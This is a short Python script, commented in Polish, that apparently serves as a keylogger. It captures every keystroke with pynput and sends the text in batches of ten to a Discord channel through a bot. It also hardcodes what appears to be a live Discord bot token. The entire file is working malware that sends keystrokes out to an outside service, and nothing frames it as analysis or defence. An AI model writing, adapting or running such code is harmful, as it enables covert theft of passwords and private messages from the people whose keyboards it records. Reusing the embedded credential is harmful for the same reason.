import discord
import pynput

# Ustawienia bota
TOKEN = 'MTMwMjI5ODAxNzQ3NDQxNjc2MQ.GAdKDv.GULVlN8luhTGErTGeugURU5oVi62kUWe40ddtw'  # Wstaw tutaj token swojego bota
CHANNEL_ID = 1302299177354530846  # Wstaw tutaj rzeczywiste ID kanału

client = discord.Client(intents=discord.Intents.default())
keys = []


def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        keys.append(str(key))

    if len(keys) >= 10:  # Wysyłaj wiadomość co 10 naciśnięć klawiszy
        message = ''.join(keys)
        client.loop.create_task(send_message(message))  # Zmiana tutaj
        keys.clear()


async def send_message(message):
    await client.wait_until_ready()  # Poczekaj, aż klient będzie gotowy
    channel = client.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(message)


@client.event
async def on_ready():
    print(f'Bot {client.user} jest gotowy!')


# Rozpoczęcie nasłuchiwania naciśnięć klawiszy
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()

client.run(TOKEN)
